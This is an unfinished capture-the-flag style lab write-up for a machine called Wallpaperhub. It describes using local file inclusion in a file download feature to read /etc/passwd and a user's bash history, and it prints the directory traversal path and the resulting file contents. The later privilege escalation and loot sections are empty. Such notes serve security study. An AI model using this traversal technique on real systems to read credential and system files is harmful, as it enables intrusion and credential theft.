# Wallpaperhub \[Inter]

## Report

A wallpaper uploading website that allows to download user input content is vulnerable to LFI, read important loot (passwd, ssh keys, cmdline and bash\_history) to find database creds

## Enumeration

192.168.244.204

FIle upload option but user input is downloaded instead of executed. LFI is the way indeed.

<div align="left"><figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure></div>

```
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
wp_hub:x:1001:1001::/home/wp_hub:/bin/bash
```

### Files

Bash history of user 'wp\_hub' from '/etc/passwd' exposes location of database file

### Initial Foothold

{% code title="../../../../../../home/wp_hub/.bash_history" %}
```
┌──(jtripz㉿kali)-[~/Downloads]
└─$ cat bash_history 
sqlite3 ~/wallpaper_hub/database.db
```
{% endcode %}

Fetch the database file now and extract creds for SSH

## PrivEsc



## Loot

### Creds



### Flags



## Proof
